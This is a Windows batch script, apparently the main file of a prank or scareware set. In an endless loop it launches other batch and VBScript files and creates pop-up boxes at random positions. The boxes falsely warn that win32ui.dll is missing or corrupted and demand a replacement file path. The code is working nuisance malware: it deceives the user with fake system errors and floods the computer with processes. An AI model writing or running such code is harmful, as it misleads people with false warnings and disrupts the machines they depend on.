rem This file is the main process that calls other subprocesses in a loop as well as generate xy coordinates

@echo off
call sub0.bat

start sub1.bat

:loop
set /a x=%random% %% 23000
set /a y=%random% %% 13000
echo a=InputBox("Warning: The following file critical to system operation is missing or corrupted: win32ui.dll. Please enter the filepath for a replacement immediately.", "Critical Warning", "C:\Windows\System32\win32ui.dll", %x%, %y%) > sub4.vbs

start sub2.bat
start sub3.vbs
start sub4.vbs
goto loop
